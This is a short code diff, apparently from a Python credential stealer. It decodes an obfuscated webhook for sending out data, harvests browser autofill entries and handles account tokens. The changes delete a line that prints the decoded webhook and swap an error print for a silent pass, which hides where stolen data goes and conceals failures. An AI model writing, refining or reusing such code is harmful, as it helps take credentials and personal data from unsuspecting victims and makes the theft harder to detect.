@@ -353,7 +353,6 @@ def startup():
 def LoadUrlib(hook, data='', files='', headers=''):
     
     hook = deobf(webhook[0],webhook[1]).decode()
-    print(hook)
     for i in range(8):
         try:
             if headers != '':
@@ -565,7 +564,7 @@ def getAutofill(path, arg):
                 AutofillCount += 1
         writeforfile(Autofill, 'autofill')
     except Exception as e:
-        print(e)
+        pass
 
 
 def get_uhq_guilds(token):
